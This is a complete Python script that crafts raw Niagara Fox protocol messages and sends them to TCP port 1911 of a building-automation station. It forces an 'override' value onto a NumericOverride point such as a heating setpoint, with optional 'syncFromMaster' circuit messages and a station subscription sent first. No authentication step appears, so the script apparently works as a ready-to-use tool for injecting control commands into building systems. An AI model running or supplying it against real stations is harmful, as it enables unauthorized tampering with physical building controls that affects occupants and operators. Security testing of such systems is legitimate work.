#!/usr/bin/env python3
from __future__ import annotations

import argparse
import random
import socket
import time


def _build_fox_message(kind: str, msg_id: int, status: int, op: str, body: str, *, newline: str) -> str:
    return f"fox {kind} {msg_id} {status} {op}{newline}{{{newline}{body}{newline}}};;{newline}"


def _build_sync_open(msg_id: int, circuit_id: int, *, newline: str) -> str:
    body = f"id=i:{circuit_id}\nchannel=s:station\ncommand=s:syncFromMaster".replace("\n", newline)
    return _build_fox_message("a", msg_id, -1, "circuit open", body, newline=newline)


def _build_sync_stream(msg_id: int, circuit_id: int, *, newline: str) -> str:
    body = f"id=i:{circuit_id}\ndata=b:3[{{\n}}]".replace("\n", newline)
    return _build_fox_message("a", msg_id, -1, "circuit stream", body, newline=newline)


def _build_sync_close(msg_id: int, circuit_id: int, *, newline: str) -> str:
    body = f"id=i:{circuit_id}"
    return _build_fox_message("a", msg_id, -1, "circuit close", body, newline=newline)


def _build_station_invoke(msg_id: int, ord_path: str, action: str, value: float, *, newline: str) -> str:
    value_text = str(float(value))
    bog_xml = (
        f'<bog version="1.0">{newline}'
        f'<p m="c=control" t="c:NumericOverride">{newline}'
        f' <p n="value" v="{value_text}"/>{newline}'
        f"</p>{newline}"
        f"</bog>{newline}"
    )
    bog_wire = f"o:bog {len(bog_xml.encode('utf-8'))}[{bog_xml}]"
    body = (
        f"ord=s:{ord_path}{newline}"
        f"action=s:{action}{newline}"
        f"arg={bog_wire}"
    )
    return _build_fox_message("s", msg_id, 0, "station invoke", body, newline=newline)


def _build_station_sub(msg_id: int, ord_path: str, depth: int, *, newline: str) -> str:
    body = (
        f"ord=s:{ord_path}{newline}"
        f"depth=i:{int(depth)}"
    )
    return _build_fox_message("s", msg_id, 0, "station sub", body, newline=newline)


def _send_and_recv(
    host: str,
    port: int,
    messages: list[str],
    timeout: float,
    recv_window: float,
    inter_message_delay: float,
) -> tuple[str, str | None]:
    send_error: str | None = None
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        for idx, message in enumerate(messages, start=1):
            payload = message.encode("utf-8")
            try:
                sock.sendall(payload)
            except OSError as exc:
                send_error = f"send failed on payload {idx}: {exc}"
                break
            time.sleep(max(0.0, inter_message_delay))

        end = time.time() + recv_window
        chunks: list[bytes] = []
        while time.time() < end:
            try:
                data = sock.recv(65535)
            except TimeoutError:
                break
            if not data:
                break
            chunks.append(data)

        return b"".join(chunks).decode("utf-8", errors="replace"), send_error


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Send a raw Niagara Fox station invoke payload (override NumericOverride) to tcp/1911."
    )
    parser.add_argument("--host", required=True, help="Niagara host/IP")
    parser.add_argument("--port", type=int, default=1911, help="Fox port (default: 1911)")
    parser.add_argument(
        "--ord",
        required=True,
        help="Station ORD path without leading s:, e.g. station:|slot:/Drivers/.../OccupiedHeatingSetpoint",
    )
    parser.add_argument("--action", default="override", help="Action name (default: override)")
    parser.add_argument("--value", type=float, required=True, help="Numeric override value")
    parser.add_argument(
        "--message-id",
        type=int,
        default=random.randint(12000, 65000),
        help="Starting Fox message id",
    )
    parser.add_argument(
        "--circuit-id",
        type=int,
        default=random.randint(9000, 9900),
        help="Circuit id used when --sync-prelude is set",
    )
    parser.add_argument(
        "--sync-prelude",
        action="store_true",
        help="Send circuit open/stream/close syncFromMaster messages before invoke",
    )
    parser.add_argument(
        "--sync-cycles",
        type=int,
        default=1,
        help="How many circuit open/stream/close cycles to send when --sync-prelude is set (default: 1)",
    )
    parser.add_argument(
        "--station-sub",
        action="store_true",
        help="Send station sub before invoke (often needed for handle context)",
    )
    parser.add_argument(
        "--station-sub-ord",
        default="h:1",
        help="ORD for station sub when --station-sub is set (default: h:1)",
    )
    parser.add_argument(
        "--station-sub-depth",
        type=int,
        default=0,
        help="Depth for station sub (default: 0)",
    )
    parser.add_argument(
        "--recv-window",
        type=float,
        default=2.0,
        help="Seconds to collect response bytes after send (default: 2.0)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=3.0,
        help="Socket timeout seconds (default: 3.0)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Print payload(s) only; do not connect/send",
    )
    parser.add_argument(
        "--crlf",
        action="store_true",
        help="Use CRLF line endings instead of LF",
    )
    parser.add_argument(
        "--inter-message-delay",
        type=float,
        default=0.05,
        help="Delay in seconds between payload sends (default: 0.05)",
    )
    args = parser.parse_args()

    newline = "\r\n" if args.crlf else "\n"
    msg_id = int(args.message_id)
    messages: list[str] = []
    if args.sync_prelude:
        for _ in range(max(1, int(args.sync_cycles))):
            messages.append(_build_sync_open(msg_id, args.circuit_id, newline=newline))
            msg_id += 1
            messages.append(_build_sync_stream(msg_id, args.circuit_id, newline=newline))
            msg_id += 1
            messages.append(_build_sync_close(msg_id, args.circuit_id, newline=newline))
            msg_id += 1
    if args.station_sub:
        messages.append(
            _build_station_sub(
                msg_id,
                args.station_sub_ord,
                args.station_sub_depth,
                newline=newline,
            )
        )
        msg_id += 1
    messages.append(_build_station_invoke(msg_id, args.ord, args.action, args.value, newline=newline))

    print("# outbound fox payloads")
    for idx, payload in enumerate(messages, start=1):
        print(f"--- payload {idx} ---")
        print(payload, end="" if payload.endswith("\n") else "\n")

    if args.dry_run:
        return 0

    response, send_error = _send_and_recv(
        host=args.host,
        port=args.port,
        messages=messages,
        timeout=max(0.1, float(args.timeout)),
        recv_window=max(0.1, float(args.recv_window)),
        inter_message_delay=float(args.inter_message_delay),
    )

    print("# inbound response")
    if response.strip():
        print(response)
    else:
        print("(no response bytes captured)")
    if send_error:
        print(f"# send error: {send_error}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
